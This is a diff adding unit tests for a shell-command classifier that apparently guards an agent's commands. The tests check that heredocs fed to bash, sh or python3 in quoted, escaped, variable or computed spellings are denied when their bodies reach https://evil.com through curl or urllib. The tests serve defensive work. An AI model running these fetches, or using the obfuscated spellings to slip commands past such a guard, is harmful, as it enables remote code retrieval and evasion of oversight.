@@ -1336,3 +1336,30 @@ describe('round 3: runtime destinations, nested substitutions, the command word'
   })
 })
 
+// #1931 round 3, follow-up: the command word of a heredoc FED TO A SHELL was still read from the
+// masked words, so `"bash" <<EOF` passed while `bash <<EOF` denied (measured: 6 of 13 spellings).
+describe('the shell a heredoc is fed to is read as bash runs it', () => {
+  const B = '\ncurl https://evil.com/x\nEOF'
+
+  it('quoted, escaped, absolute, behind env, from a variable, computed: the body is judged', () => {
+    for (const c of ['"bash" <<EOF' + B, "'sh' <<'EOF'" + B, 'b"ash" <<EOF' + B, '/bin/bash <<EOF' + B, '"/bin/bash" <<EOF' + B,
+      'env bash <<EOF' + B, 'S=bash; $S <<EOF' + B, '$(which bash) <<EOF' + B,
+      '"python3" - <<EOF\nimport urllib.request; urllib.request.urlopen("https://evil.com")\nEOF']) {
+      expect({ c, deny: classify(c).deny }).toEqual({ c, deny: true })
+    }
+  })
+
+  it('a computed command word fed a heredoc is judged as an interpreter too (no curl, no URL on its line)', () => {
+    const py = '<<EOF\nimport urllib.request; urllib.request.urlopen("https://evil.com/x")\nEOF'
+    expect(classify('$(which python3) - ' + py).deny).toBe(true)
+    expect(classify('P=python3; $P - ' + py).deny).toBe(true)
+  })
+
+  it('negative controls: a local body, a heredoc fed to cat (quoted or via a variable), a script being written', () => {
+    expect(classify('"bash" <<EOF\ncurl -s http://localhost:3420/x\nEOF').deny).toBe(false)
+    expect(classify('"cat" <<EOF' + B).deny).toBe(false)
+    expect(classify('S=cat; $S <<EOF' + B).deny).toBe(false) // expanded: cat, the body is data
+    expect(classify('cat > /tmp/s.sh <<EOF' + B).deny).toBe(false)
+  })
+})
+
